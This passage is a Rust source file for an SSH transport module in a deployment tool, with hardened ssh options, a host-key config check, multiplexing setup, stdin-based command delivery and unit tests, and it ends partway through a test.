//! `SshConnection` — runs commands on a remote host over the `ssh` subprocess.
//!
//! Shells out to `ssh` (no native SSH
//! client), with `ControlMaster` multiplexing so a run's many probes and writes
//! share one TCP+auth round-trip (and bridge back-to-back `zap` invocations). The
//! remote command `ssh` is given is a constant `sh -c` wrapper; the command itself —
//! with its `cwd` / `env` / `sudo` composed around it — is the script that wrapper reads
//! on its stdin (`super::delivery`), so no command text, `env` value, or `cwd` is on the
//! argv of the local `ssh`, the target's login shell, or the target's `sh`. Each program
//! a command starts has its own argv.
//!
//! Privilege is split: `run` does **not** auto-`sudo` (a command that needs root says
//! so); the file helpers on `Connection` (`read_bytes` / `snapshot` / `write_file` /
//! `make_dir` / `make_symlink` / `set_dir_attrs`) prepend `sudo`. Detection doesn't go through `run`:
//! its batches (`connection::observe`) pick the privilege per lane. The unit tests below
//! cover the argv mapping and command wrapping, and `delivery`'s tests the delivery
//! itself against real shells; execution against a real host is validated by hand
//! (`docs/testing.md`).
//!
//! `copy_file` (the scp artifact-push primitive) ships to a connecting-user-writable
//! destination (a `remote` file's / `build` source's archive staging, in a per-run
//! private `mktemp -d` dir — still under `/tmp`, but `0700` and
//! connecting-user-owned so no other local user can pre-create the path and swap bytes
//! under it), so it's a plain `scp`, deliberately *never* escalating. Privileged
//! placement into a possibly root-owned final destination is the sibling
//! `Connection::place_file` (and, for a tarball extract, the `sudo sh -c '…'` wrap in
//! `resource::execute`) — the put script shared with `write_file`.
//!
//! Every `ssh` and `scp` a connection starts first waits on one `ssh -G` read of the
//! operator's effective config per target (`SshConnection::host_keys_checked`), and a
//! config that leaves host keys unchecked refuses the connection.
//!
//! There is no connectivity fallback to another user: a run connects as the declared
//! `user`, or as `bootstrap_user` when `--bootstrap` selects it, never as `root`
//! because the first failed.

use std::path::Path;
use std::process::Stdio;

use tokio::process::Command;

use super::delivery::{Delivery, ssh_remote_arg};
use super::{CommandOutput, RawOutput, RunOptions};
use crate::error::{Error, Result};
#[cfg(not(test))]
use crate::escape::escape_line;
#[cfg(not(test))]
use crate::home::zap_home_default;
use crate::home::{SSH_DIR, ensure_state_dir};

/// Default `ssh` options: bootstrappable-but-checked host keys, fail-fast timeouts +
/// keepalive, `BatchMode` (error instead of prompting for a password), and no
/// forwarding of any kind, no tunnel device, no terminal, and no `LocalCommand`,
/// whatever the operator's `ssh` config says (`Host * ForwardAgent yes` would otherwise
/// hand every session, root lanes included, the operator's agent). `ssh` takes the
/// first value it reads for an option, and the command line comes before every config
/// file. `ControlMaster`
/// multiplexing is added by [`multiplexing_args`]: `ClearAllForwardings` clears port
/// forwards only, which a mux client asks for on its own and zap never does.
const SSH_OPTIONS: &[&str] = &[
    "-o",
    "StrictHostKeyChecking=accept-new",
    "-o",
    "ConnectTimeout=10",
    "-o",
    "ServerAliveInterval=30",
    "-o",
    "ServerAliveCountMax=3",
    "-o",
    "BatchMode=yes",
    "-o",
    "ForwardAgent=no",
    "-o",
    "ForwardX11=no",
    "-o",
    "ClearAllForwardings=yes",
    "-o",
    "RequestTTY=no",
    "-o",
    "PermitLocalCommand=no",
    "-o",
    "Tunnel=no",
];

/// How long `ssh -G` may take to print the effective config
/// ([`SshConnection::host_keys_checked`]): it reads config files and runs any `Match exec`
/// command, and touches no network.
const CONFIG_READ_TIMEOUT: std::time::Duration = std::time::Duration::from_secs(30);

/// Why the effective config `ssh -G` printed (`config`) leaves host keys unchecked, or
/// `None` when it checks them. `accept-new` trusts a host's first key and refuses a
/// changed one only when the first was recorded, so a run refuses a config whose every
/// `UserKnownHostsFile` is `/dev/null` (nothing is ever recorded). The
/// `StrictHostKeyChecking` branch is a backstop: zap's own `-o` comes first on the
/// command line, so `ssh -G` can't print `no`/`off` (`false`) for it today; it refuses
/// should that ever change. A config with neither line is refused too: it isn't one
/// `ssh` printed.
fn host_key_config_problem(config: &str) -> Option<String> {
    let value = |key: &str| {
        config
            .lines()
            .find_map(|line| line.strip_prefix(key)?.strip_prefix(' '))
    };
    match value("stricthostkeychecking") {
        Some(checking @ ("false" | "no" | "off")) => {
            return Some(format!(
                "the effective `StrictHostKeyChecking` is {checking}, so a changed host key \
                 would be accepted"
            ));
        }
        Some(_) => {}
        None => {
            return Some(
                "`ssh -G` printed no `stricthostkeychecking`, so the host key checking can't \
                 be confirmed"
                    .to_owned(),
            );
        }
    }
    match value("userknownhostsfile") {
        Some(files) if files.split_whitespace().any(|file| file != "/dev/null") => None,
        Some(_) => Some(
            "every `UserKnownHostsFile` is /dev/null, so no host key is ever recorded and \
             every key, a changed one included, is trusted as a first use; point \
             `UserKnownHostsFile` at a real file for this host"
                .to_owned(),
        ),
        None => Some(
            "`ssh -G` printed no `userknownhostsfile`, so where host keys are recorded can't \
             be confirmed"
                .to_owned(),
        ),
    }
}

/// A socket's file name in the home's socket directory (`crate::home::SSH_DIR`): `%C`
/// is `ssh`'s hash of the connection (local host, remote host, port, user),
/// [`CONTROL_HASH_LEN`] characters.
const CONTROL_NAME: &str = "cm-%C";

/// The length `ssh` expands `%C` to: a SHA-1 in hex, in every OpenSSH that has the
/// token so far. Were a later one to print a longer hash, a socket path counted here
/// as fitting could run past [`SOCKET_PATH_MAX`] for a mid-length home, and `ssh`
/// would fail to bind its control socket (`unix_listener: path … too long for Unix
/// domain socket`): this is the number to raise.
const CONTROL_HASH_LEN: usize = 40;

/// What `ssh` appends to the socket's path while it binds it: a `.` and a random name.
const CONTROL_BIND_SUFFIX_LEN: usize = 17;

/// The longest path a Unix socket address holds, its terminating NUL included, on the
/// platform with the least room for one.
const SOCKET_PATH_MAX: usize = 104;

/// Why a zap home gets no `ControlPath`.
#[derive(Debug, PartialEq, Eq)]
enum NoControlPath {
    /// A socket under the home would have a path too long to bind: the longest home
    /// that leaves room.
    TooLong {
        /// The most bytes a home's path may have.
        max: usize,
    },
    /// The home's path holds a character the option's quoting doesn't carry the same
    /// way to every `ssh`.
    Unquotable,
}

/// The `ControlPath` option's value for sockets under `zap_home`.
///
/// `ssh` reads an `-o` argument as a line of its config: split at whitespace, with
/// double quotes around a value that holds any. The path is always written quoted, so
/// a home with a space in it is one value; a `%` in it is doubled, since `ssh` expands
/// the option's tokens.
///
/// # Errors
/// [`NoControlPath::TooLong`] for a home whose socket would have a path too long to
/// bind — `ssh` fails outright on one, so such a home gets no multiplexing instead.
/// [`NoControlPath::Unquotable`] for a home holding a `"`, a backslash, or a control
/// character: how those are escaped inside the quotes differs between OpenSSH
/// versions, and a path read differently is a socket somewhere else.
fn control_path(zap_home: &Path) -> std::result::Result<String, NoControlPath> {
    let fixed = "/".len()
        + SSH_DIR.len()
        + "/".len()
        + (CONTROL_NAME.len() - "%C".len() + CONTROL_HASH_LEN)
        + CONTROL_BIND_SUFFIX_LEN
        + 1;
    let max = SOCKET_PATH_MAX - fixed;
    let home = zap_home
        .to_str()
        .filter(|home| !home.contains(|c: char| c == '"' || c == '\\' || c.is_control()))
        .ok_or(NoControlPath::Unquotable)?;
    if home.len() > max {
        return Err(NoControlPath::TooLong { max });
    }
    Ok(format!(
        "\"{}/{SSH_DIR}/{CONTROL_NAME}\"",
        home.replace('%', "%%")
    ))
}

/// The `ControlMaster` options for a zap whose home is `zap_home`, and — when there
/// are none — the line that says why.
///
/// With them, a master per connection under `<zap_home>/ssh/`, kept warm for 300 s —
/// long enough to bridge a detect→apply chain without lingering stale auth. Without,
/// `ssh` runs unmultiplexed, each command its own connection: when the home has no
/// usable socket path ([`control_path`]), or its `ssh/` can't be established as zap's
/// own (`crate::home::ensure_state_dir`) — a socket is placed only in a directory no
/// one else can reach.
fn multiplexing_for(zap_home: &Path, establish: bool) -> (Vec<String>, Option<String>) {
    let off = |why: String| {
        let notice =
            format!("zap: no SSH multiplexing — {why}; every command opens its own connection");
        (Vec::new(), Some(notice))
    };
    let path = match control_path(zap_home) {
        Ok(path) => path,
        Err(NoControlPath::TooLong { max }) => {
            return off(format!(
                "a control socket under {} would have a path longer than a Unix socket \
                 address holds (zap's home may be {max} bytes at most; set `ZAP_HOME` to a \
                 shorter path to multiplex)",
                zap_home.display()
            ));
        }
        Err(NoControlPath::Unquotable) => {
            return off(format!(
                "zap's home {} holds a quote, a backslash, or a control character, which \
                 `ssh` doesn't read the same way in every version",
                zap_home.display()
            ));
        }
    };
    let socket_dir = zap_home.join(SSH_DIR);
    if establish && let Err(error) = ensure_state_dir(zap_home, &socket_dir) {
        return off(format!(
            "the socket directory {} can't be made zap's own ({error})",
            socket_dir.display()
        ));
    }
    let args = [
        "-o",
        "ControlMaster=auto",
        "-o",
        &format!("ControlPath={path}"),
        "-o",
        "ControlPersist=300",
    ]
    .map(str::to_owned)
    .into();
    (args, None)
}

/// This process's `ControlMaster` options ([`multiplexing_for`] its zap home), settled
/// once: the socket directory is established the first time a connection is built, and
/// a home that gets none says so then, in one line on stderr. With no home there are
/// none and nothing to say.
#[cfg(not(test))]
fn multiplexing_args() -> &'static [String] {
    static ARGS: std::sync::OnceLock<Vec<String>> = std::sync::OnceLock::new();
    use std::io::Write as _;

    ARGS.get_or_init(|| {
        let Some(home) = zap_home_default().ok().flatten() else {
            return Vec::new();
        };
        let (args, notice) = multiplexing_for(&home, true);
        if let Some(notice) = notice {
            // Best-effort: a standard error that can't take the notice drops it, where a
            // print macro would abort the run.
            let _ = writeln!(std::io::stderr().lock(), "{}", escape_line(&notice));
        }
        args
    })
}

/// A unit test's `ControlMaster` options: those of a home that is never made, so no
/// test reaches a home directory — every connection it makes is the stand-in client's.
#[cfg(test)]
fn multiplexing_args() -> &'static [String] {
    static ARGS: std::sync::OnceLock<Vec<String>> = std::sync::OnceLock::new();
    ARGS.get_or_init(|| multiplexing_for(Path::new("/zap-test-home"), false).0)
}

/// A resolved SSH target.
///
/// `host` / `user` are already reference-resolved by the connection builder; `home`
/// carries the declared `target.home` (the remote home, for resolving `~` / `$HOME`
/// in path fields).
#[derive(Debug, Clone)]
pub struct SshConnection {
    /// Resolved remote host.
    pub host: String,
    /// Resolved remote user.
    pub user: String,
    /// SSH port (22 when `None`; not passed to `ssh` in that case).
    pub port: Option<u16>,
    /// Private key path (`-i`), if not relying on default key resolution.
    pub key_path: Option<String>,
    /// The declared remote home (`target.home`), if any — used to resolve `~` /
    /// `$HOME` in remote path fields.
    pub home: Option<String>,
}

impl SshConnection {
    /// The shared transport options (multiplexing/host-key/timeout `-o` flags, a
    /// non-default port, an explicit key) common to `ssh` and `scp`. The port flag
    /// differs between the two tools (`ssh -p`, `scp -P`), so the caller passes it.
    fn transport_args(&self, port_flag: &str) -> Vec<String> {
        let mut args: Vec<String> = SSH_OPTIONS.iter().map(|opt| (*opt).to_owned()).collect();
        args.extend_from_slice(multiplexing_args());
        if let Some(port) = self.port
            && port != 22
        {
            args.push(port_flag.to_owned());
            args.push(port.to_string());
        }
        if let Some(key) = &self.key_path {
            args.push("-i".to_owned());
            args.push(key.clone());
        }
        args
    }

    /// Where `ssh` and `scp` connect: `user@host`, or the bare host when no user is
    /// declared — `ssh` then picks the user itself (its config, else the operator's
    /// login name).
    fn destination(&self) -> String {
        if self.user.is_empty() {
            self.host.clone()
        } else {
            format!("{}@{}", self.user, self.host)
        }
    }

    /// `remote` on the target as `scp` names it: the [`destination`](Self::destination),
    /// `:`, the path. `scp` reads the machine up to the first `:`, so a host that holds
    /// one — an IPv6 address — goes in brackets here (`user@[fe80::1]:/path`), `scp`'s
    /// own form for it. `ssh` takes the address bare, and reads brackets as part of a
    /// name, so they are written nowhere else.
    fn scp_destination(&self, remote: &str) -> String {
        if self.host.contains(':') {
            let user = if self.user.is_empty() {
                String::new()
            } else {
                format!("{}@", self.user)
            };
            format!("{user}[{}]:{remote}", self.host)
        } else {
            format!("{}:{remote}", self.destination())
        }
    }

    /// The base `ssh` argv (transport options + the [`destination`](Self::destination)),
    /// before the remote command.
    pub(super) fn ssh_args(&self) -> Vec<String> {
        let mut args = self.transport_args("-p");
        args.push(self.destination());
        args
    }

    /// Compose `cmd` with `cwd` and `env` into the script the shell runs — read from its
    /// stdin, never an argv:
    ///
    /// ```text
    /// CDPATH= cd -P -- '<cwd>' || exit; export K='v' …
    /// <cmd>
    /// ```
    ///
    /// - The first line is `zap_types::shell::run_context`'s — the one a script's check
    ///   is composed with: a `cwd` that can't be entered ends the script with `cd`'s
    ///   status and its message, and nothing of `cmd` runs, however it is composed or
    ///   whether it parses; the `env` is exported after the `cd` and for the whole of
    ///   `cmd`. With neither, the script is `<cmd>` alone.
    ///
    /// `pub(crate)` so the escalated-extract composition test in `resource::execute` can
    /// drive the real composition rather than a local `format!` copy.
    pub(crate) fn wrap_remote(cmd: &str, options: &RunOptions) -> String {
        let cwd = options.cwd.as_ref().map(|cwd| cwd.to_string_lossy());
        let mut remote = zap_types::shell::run_context(
            cwd.as_deref(),
            options
                .env
                .iter()
                .map(|(key, value)| (key.as_str(), value.as_str())),
            zap_types::shell::CdMessage::Kept,
        );
        remote.push_str(cmd);
        remote
    }

    /// The `ssh` invocation that runs `delivery` on the target: the transport options,
    /// `user@host`, and the delivery's constant wrapper as the remote command. Nothing of
    /// the command being run is in its argv.
    pub(super) fn delivery_command(&self, delivery: &Delivery) -> Command {
        let mut command = client_command();
        command
            .args(self.ssh_args())
            .arg(ssh_remote_arg(delivery.wrapper));
        command
    }

    /// Run `script` on the remote with `payload` as its commands' stdin (`None`: they
    /// read nothing) — the one place a command leaves for the target. The script and the
    /// payload travel on the `ssh` subprocess's stdin, which `ssh` forwards to the
    /// constant wrapper it runs ([`Delivery`]).
    ///
    /// The inner result is the `ssh` process's: a failure to start it is the caller's to
    /// report as a failed run.
    ///
    /// # Errors
    /// [`Error::Command`] when `script` can't be delivered at all (it holds a NUL byte):
    /// nothing was sent, which must not read as a command that ran and failed.
    async fn deliver(
        &self,
        script: &str,
        payload: Option<&[u8]>,
    ) -> Result<std::io::Result<std::process::Output>> {
        self.host_keys_checked().await?;
        let delivery = Delivery::of(script, payload).map_err(Error::Command)?;
        let command = self.delivery_command(&delivery);
        Ok(delivery.run(command).await)
    }

    /// Run a command on the remote host. A spawn failure (e.g. `ssh` not on PATH) is
    /// mapped to a failed [`CommandOutput`], never an error — a non-zero remote exit
    /// is likewise `success == false`, mirroring the local arm.
    ///
    /// The command, composed with `options` by `wrap_remote`, is
    /// the script the remote shell reads on its stdin: neither it, nor an `env` value,
    /// nor the `cwd` is on the argv of the local `ssh`, the target's login shell, or the
    /// target's `sh`. Each program the command starts has its own argv.
    ///
    /// # Errors
    /// [`Error::Command`] when the command holds a NUL byte. A spawn failure degrades
    /// to a failed `CommandOutput`.
    pub async fn run(&self, cmd: &str, options: &RunOptions) -> Result<CommandOutput> {
        let remote = Self::wrap_remote(cmd, options);
        match self.deliver(&remote, None).await? {
            Ok(output) => Ok(output.into()),
            Err(error) => Ok(CommandOutput::failed(format!(
                "failed to execute ssh: {error}"
            ))),
        }
    }

    /// Run `cmd` on the remote, feeding `content` to it over the `ssh` subprocess's
    /// stdin (ssh forwards stdin to the remote command).
    ///
    /// The channel for content that must not appear in the argv — `write_file` hands
    /// the put script a file's digest and bytes this way, so a secret-bearing file never
    /// lands in the target's process list. `cmd` travels on the same stdin, framed ahead of the
    /// content (`Delivery`), with **no** `sudo`/`cwd`/`env` prefixing: the caller
    /// passes the complete command (the write helpers inline their own `sudo`). The
    /// stdin is written from a concurrent task so a full output pipe can't deadlock the
    /// input write.
    ///
    /// # Errors
    /// [`Error::Command`] when `cmd` holds a NUL byte. A spawn/transport failure degrades
    /// to a failed [`CommandOutput`], not an `Err`.
    pub async fn run_with_stdin(&self, cmd: &str, content: &[u8]) -> Result<CommandOutput> {
        match self.deliver(cmd, Some(content)).await? {
            Ok(output) => Ok(output.into()),
            Err(error) => Ok(CommandOutput::failed(format!(
                "failed to execute ssh: {error}"
            ))),
        }
    }

    /// Run `cmd` on the remote and capture its **raw** stdout bytes — the binary-safe
    /// read path ([`Connection::read_bytes`](super::Connection::read_bytes) over SSH).
    /// Delivered like [`run`](Self::run) (the caller passes the complete command — the
    /// read helpers compose their own `sudo` and constant script), but the stdout stays `Vec<u8>` rather
    /// than the lossy `String` of [`CommandOutput`], so a binary file isn't corrupted:
    /// `ssh` forwards the remote stdout over an 8-bit-clean pipe, so the captured bytes
    /// are exact.
    ///
    /// # Errors
    /// [`Error::Command`] when `cmd` holds a NUL byte. A spawn/transport failure degrades
    /// to a failed [`RawOutput`], not an `Err`.
    pub(super) async fn run_raw_stdout(&self, cmd: &str) -> Result<RawOutput> {
        match self.deliver(cmd, None).await? {
            Ok(output) => Ok(output.into()),
            Err(error) => Ok(RawOutput::failed(format!("failed to execute ssh: {error}"))),
        }
    }

    /// Upload a local file to `remote` via `scp` — the archive-staging primitive.
    /// Reuses the SSH options (so it rides the `ControlMaster` socket the connectivity
    /// check primed), with `scp`'s `-P` port flag (vs `ssh`'s `-p`). `remote` is a bare
    /// path on the host, in a directory the connecting user alone writes, so no `sudo`
    /// is involved.
    ///
    /// # Errors
    /// [`Error::Command`] if `scp` can't be spawned; [`Error::FileOp`] on a non-zero
    /// `scp` exit (carrying its stderr).
    pub async fn copy_file(&self, local: &Path, remote: &str) -> Result<()> {
        self.host_keys_checked().await?;
        let mut args = self.transport_args("-P");
        args.push(local.to_string_lossy().into_owned());
        args.push(self.scp_destination(remote));

        let output = scp_command()
            .args(&args)
            .stdin(Stdio::null())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .output()
            .await
            .map_err(Error::Command)?;
        if output.status.success() {
            Ok(())
        } else {
            Err(Error::FileOp {
                op: "scp",
                path: remote.to_owned(),
                cause: crate::error::FailureCause::Exited {
                    stderr: String::from_utf8_lossy(&output.stderr).trim().to_owned(),
                    code: output
                        .status
                        .code()
                        .unwrap_or(zap_types::error_code::NO_EXIT_CODE),
                },
            })
        }
    }

    /// Refuse to connect when the operator's `ssh` config leaves host keys unchecked
    /// ([`host_key_config_problem`]), read once per process for each target with
    /// `ssh -G` and the same options a connection is made with. Every `ssh` and `scp` a
    /// connection starts waits on it, so nothing reaches a host whose key isn't checked.
    ///
    /// The verdict is kept for the process's lifetime, a refusal included: an `ssh -G`
    /// that failed or timed out refuses every later connection to that target in the
    /// same run, which suits a one-shot CLI (the next invocation reads the config
    /// again).
    ///
    /// # Errors
    /// [`Error::Connectivity`] naming the setting, or why `ssh -G` couldn't say.
    pub(super) async fn host_keys_checked(&self) -> Result<()> {
        type Checked = Vec<(Vec<std::ffi::OsString>, std::result::Result<(), String>)>;
        static CHECKED: std::sync::Mutex<Checked> = std::sync::Mutex::new(Vec::new());
        let mut key = ssh_client();
        key.extend(self.ssh_args().into_iter().map(Into::into));
        let cached = CHECKED
            .lock()
            .unwrap_or_else(std::sync::PoisonError::into_inner)
            .iter()
            .find(|(known, _)| *known == key)
            .map(|(_, checked)| checked.clone());
        let checked = if let Some(checked) = cached {
            checked
        } else {
            let checked = self.read_host_key_config().await;
            CHECKED
                .lock()
                .unwrap_or_else(std::sync::PoisonError::into_inner)
                .push((key, checked.clone()));
            checked
        };
        checked.map_err(|message| Error::Connectivity {
            target: format!("ssh://{}", self.destination()),
            message,
            changed_host_key: None,
        })
    }

    /// Read the effective config with `ssh -G` and judge it ([`host_key_config_problem`]);
    /// the `Err` is why the connection is refused.
    async fn read_host_key_config(&self) -> std::result::Result<(), String> {
        let mut args = vec!["-G".to_owned()];
        args.extend(self.ssh_args());
        let output = tokio::time::timeout(
            CONFIG_READ_TIMEOUT,
            client_command()
                .args(&args)
                .stdin(Stdio::null())
                .kill_on_drop(true)
                .output(),
        )
        .await;
        let output = match output {
            Err(_) => {
                return Err(format!(
                    "`ssh -G` didn't print the effective config within {}s, so the host key \
                     checking can't be confirmed",
                    CONFIG_READ_TIMEOUT.as_secs()
                ));
            }
            Ok(Err(error)) => return Err(format!("failed to execute ssh -G: {error}")),
            Ok(Ok(output)) => output,
        };
        if !output.status.success() {
            return Err(format!(
                "`ssh -G` failed, so the host key checking can't be confirmed: {}",
                String::from_utf8_lossy(&output.stderr).trim()
            ));
        }
        host_key_config_problem(&String::from_utf8_lossy(&output.stdout))
            .map_or(Ok(()), |problem| {
                Err(format!("refusing to connect: {problem}"))
            })
    }

    /// Verify connectivity by running `true` on the remote. A changed host key gets
    /// zap's advice (the `ssh-keygen -R` recovery) as the error's hint, after what `ssh`
    /// said.
    ///
    /// # Errors
    /// [`Error::Connectivity`] if `ssh` can't reach the host or run a command, or the
    /// operator's `ssh` config leaves host keys unchecked.
    pub async fn check_connectivity(&self) -> Result<()> {
        let result = self.run("true", &RunOptions::default()).await?;
        if result.success {
            return Ok(());
        }
        Err(self.connectivity_error(&result.stderr))
    }

    /// The [`Error::Connectivity`] for a failed `ssh` whose stderr was `stderr` — the one
    /// wording [`check_connectivity`](Self::check_connectivity) and a detection batch that
    /// can't reach the target share: `ssh`'s own message, and for a changed host key
    /// zap's advice (the `ssh-keygen -R` recovery) as the error's hint, apart from it.
    pub(super) fn connectivity_error(&self, stderr: &str) -> Error {
        let stderr = stderr.trim();
        let label = format!("ssh://{}", self.destination());
        let changed_host_key = stderr
            .contains("REMOTE HOST IDENTIFICATION HAS CHANGED")
            .then(|| self.host.clone());
        let message = if stderr.is_empty() {
            "connection failed".to_owned()
        } else {
            stderr.to_owned()
        };
        Error::Connectivity {
            target: label,
            message,
            changed_host_key,
        }
    }
}

/// The `ssh` client, ready for its transport options: what every `ssh` zap starts — a
/// delivery, a detection batch, the `ssh -G` reads of its config — is built from, so a
/// test's stand-in stands in for all of them.
pub(super) fn client_command() -> Command {
    let client = ssh_client();
    let mut command = Command::new(&client[0]);
    command.args(&client[1..]);
    command
}

/// The `scp` client, ready for its transport options. A test's stand-in `ssh` stands
/// in for it too, so no test starts the real one.
fn scp_command() -> Command {
    #[cfg(test)]
    if test_client::get().is_some() {
        return client_command();
    }
    Command::new("scp")
}

/// The `ssh` client a command is started with: the program, then any arguments ahead of
/// the transport options.
fn ssh_client() -> Vec<std::ffi::OsString> {
    #[cfg(test)]
    if let Some(client) = test_client::get() {
        return client;
    }
    vec!["ssh".into()]
}

/// A stand-in `ssh` client a test supplies — used by [`ssh_client`] on the test's own
/// thread only.
#[cfg(test)]
pub(crate) mod test_client {
    use std::cell::RefCell;
    use std::ffi::OsString;
    use std::path::{Path, PathBuf};

    thread_local! {
        static CLIENT: RefCell<Option<Vec<OsString>>> = const { RefCell::new(None) };
    }

    /// The stand-in client on this thread, if one is set.
    pub(super) fn get() -> Option<Vec<OsString>> {
        CLIENT.with_borrow(Clone::clone)
    }

    /// Holds a stand-in client; dropping it removes it.
    pub struct TestClient {
        script: PathBuf,
    }

    /// What a stand-in does with the remote command it is given.
    #[derive(Clone, Copy)]
    pub enum Remote {
        /// Run it as a login shell would (`sh -c`), its stdin passed through.
        Run,
        /// File the stdin it was sent, running nothing.
        Record,
        /// Refuse the connection as `ssh` does: exit 255, naming on stderr everything
        /// it was started with — the `user@host` destination among it.
        Refuse,
    }

    /// The effective config a stand-in prints for `ssh -G`: host keys checked and
    /// recorded, as an operator's default config has them.
    pub const CHECKED_CONFIG: &str = "stricthostkeychecking accept-new\nuserknownhostsfile ~/.ssh/known_hosts ~/.ssh/known_hosts2\n";

    /// Stand a shell script in `dir` in for `ssh` on this thread until the returned
    /// guard drops. It files its arguments, one a line, at `<script>.argv`, and answers
    /// `ssh -G` with [`CHECKED_CONFIG`], filing nothing. A test's control sockets belong
    /// to a home that is never made (`multiplexing_args`), so no test reaches the
    /// operator's `~/.zap`.
    pub fn set(dir: &Path, remote: Remote) -> TestClient {
        set_with_config(dir, remote, CHECKED_CONFIG)
    }

    /// [`set`], with the stand-in answering `ssh -G` with `config` (no `'` in it).
    pub fn set_with_config(dir: &Path, remote: Remote, config: &str) -> TestClient {
        assert!(!config.contains('\''));
        let script = dir.join("ssh.sh");
        let act = match remote {
            Remote::Run => r#"exec sh -c "$last""#,
            Remote::Record => r#"cat > "$0.stdin""#,
            Remote::Refuse => {
                r#"echo "ssh: connect to host failed ($*): Connection refused" >&2; exit 255"#
            }
        };
        std::fs::write(
            &script,
            format!(
                "if [ \"$1\" = -G ]; then printf '%s' '{config}'; exit 0; fi\n\
                 printf '%s\\n' \"$@\" > \"$0.argv\"\nfor last; do :; done\n{act}\n"
            ),
        )
        .unwrap();
        CLIENT.set(Some(vec!["sh".into(), script.clone().into()]));
        TestClient { script }
    }

    impl TestClient {
        /// The arguments the stand-in was last started with, as one text.
        pub fn argv(&self) -> String {
            std::fs::read_to_string(self.script.with_extension("sh.argv")).unwrap()
        }

        /// The stdin a [`Remote::Record`] stand-in was last sent.
        pub fn stdin(&self) -> Vec<u8> {
            std::fs::read(self.script.with_extension("sh.stdin")).unwrap()
        }
    }

    impl Drop for TestClient {
        fn drop(&mut self) {
            CLIENT.set(None);
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn ssh(port: Option<u16>, key_path: Option<&str>) -> SshConnection {
        SshConnection {
            host: "host.example".to_owned(),
            user: "deploy".to_owned(),
            port,
            key_path: key_path.map(str::to_owned),
            home: None,
        }
    }

    /// The argv opens with zap's options, ahead of anything else: the first value `ssh`
    /// reads for an option is the one it keeps, so the operator's config can't turn
    /// forwarding, a terminal, or a `LocalCommand` back on.
    #[test]
    fn the_argv_overrides_forwarding_and_checks_host_keys() {
        let args = ssh(None, None).ssh_args();
        assert_eq!(
            args[..22],
            [
                "-o",
                "StrictHostKeyChecking=accept-new",
                "-o",
                "ConnectTimeout=10",
                "-o",
                "ServerAliveInterval=30",
                "-o",
                "ServerAliveCountMax=3",
                "-o",
                "BatchMode=yes",
                "-o",
                "ForwardAgent=no",
                "-o",
                "ForwardX11=no",
                "-o",
                "ClearAllForwardings=yes",
                "-o",
                "RequestTTY=no",
                "-o",
                "PermitLocalCommand=no",
                "-o",
                "Tunnel=no",
            ]
        );
    }

    #[test]
    fn a_config_that_leaves_host_keys_unchecked_is_named() {
        let config = |checking: &str, files: &str| {
            format!(
                "user deploy\nstricthostkeychecking {checking}\nuserknownhostsfile {files}\n\
                 globalknownhostsfile /etc/ssh/ssh_known_hosts\n"
            )
        };
        for (checking, files) in [
            ("accept-new", "~/.ssh/known_hosts ~/.ssh/known_hosts2"),
            ("true", "/dev/null /srv/known"),
            ("ask", "~/.ssh/known_hosts"),
        ] {
            assert_eq!(host_key_config_problem(&config(checking, files)), None);
        }
        for files in ["/dev/null", "/dev/null /dev/null"] {
            let problem = host_key_config_problem(&config("accept-new", files)).unwrap();
            assert!(
                problem.contains("every `UserKnownHostsFile` is /dev/null"),
                "{problem}"
            );
        }
        for checking in ["false", "no", "off"] {
            let problem = host_key_config_problem(&config(checking, "~/.ssh/known_hosts")).unwrap();
            assert!(
                problem.contains(&format!("`StrictHostKeyChecking` is {checking}")),
                "{problem}"
            );
        }
        // neither line, or only the one: not something `ssh -G` printed
        assert!(
            host_key_config_problem("")
                .unwrap()
                .contains("stricthostkeychecking")
        );
        assert!(
            host_key_config_problem("stricthostkeychecking accept-new\n")
                .unwrap()
                .contains("userknownhostsfile")
        );
        // a key that only begins with the name is another key
        assert!(
            host_key_config_problem(
                "stricthostkeycheckingx false\nstricthostkeychecking accept-new\n\
                 userknownhostsfile ~/.ssh/known_hosts\n"
            )
            .is_none()
        );
    }

    /// A config that leaves host keys unchecked refuses every connection before one is
    /// made: the stand-in is started for `ssh -G` alone, which files no argv.
    #[tokio::test]
    async fn an_unchecked_host_key_config_refuses_before_connecting() {
        use super::test_client::{self, Remote};

        let dir = tempfile::tempdir().unwrap();
        let _client = test_client::set_with_config(
            dir.path(),
            Remote::Run,
            "stricthostkeychecking accept-new\nuserknownhostsfile /dev/null\n",
        );
        let conn = ssh(None, None);
        let refused = |error: Error| {
            let Error::Connectivity {
                target,
                message,
                changed_host_key,
            } = error
            else {
                panic!("expected a refused connection: {error}");
            };
            assert_eq!(target, "ssh://deploy@host.example");
            assert!(
                message.starts_with("refusing to connect: every `UserKnownHostsFile` is /dev/null"),
                "{message}"
            );
            assert_eq!(changed_host_key, None);
        };
        refused(conn.check_connectivity().await.unwrap_err());
        refused(conn.run("true", &RunOptions::default()).await.unwrap_err());
        refused(
            conn.copy_file(Path::new("/etc/hostname"), "/srv/copied")
                .await
                .unwrap_err(),
        );
        let queries = [zap_types::observe::Query::Path {
            path: "/etc/hostname".to_owned(),
            facet: zap_types::observe::PathFacet::Kind,
            privilege: zap_types::observe::Privilege::Login,
        }];
        refused(
            super::super::Connection::Ssh(conn.clone())
                .observe(&queries)
                .await
                .unwrap_err(),
        );
        assert!(
            !dir.path().join("ssh.sh.argv").exists(),
            "nothing connected"
        );

        // a failing `ssh -G` refuses too, saying so
        let failing = tempfile::tempdir().unwrap();
        let _client = test_client::set(failing.path(), Remote::Run);
        std::fs::write(
            failing.path().join("ssh.sh"),
            "echo 'bad config line' >&2; exit 255\n",
        )
        .unwrap();
        let error = conn.check_connectivity().await.unwrap_err().to_string();
        assert!(error.contains("`ssh -G` failed"), "{error}");
        assert!(error.contains("bad config line"), "{error}");
    }

    #[test]
    fn argv_omits_default_port_and_key() {
        let args = ssh(None, None).ssh_args();
        assert!(!args.iter().any(|a| a == "-p"));
        assert!(!args.iter().any(|a| a == "-i"));
        assert_eq!(args.last().map(String::as_str), Some("deploy@host.example"));
        // multiplexing is requested
        assert!(args.iter().any(|a| a == "ControlMaster=auto"));
        assert!(
            args.iter()
                .any(|a| a == "ControlPath=\"/zap-test-home/ssh/cm-%C\"")
        );
    }

    /// `scp`'s destination is the host, `:`, the path — and a host that holds a `:`
    /// itself stands in brackets there, and only there.
    #[test]
    fn an_ipv6_host_is_bracketed_for_scp_and_bare_for_ssh() {
        let at = |user: &str, host: &str| SshConnection {
            host: host.to_owned(),
            user: user.to_owned(),
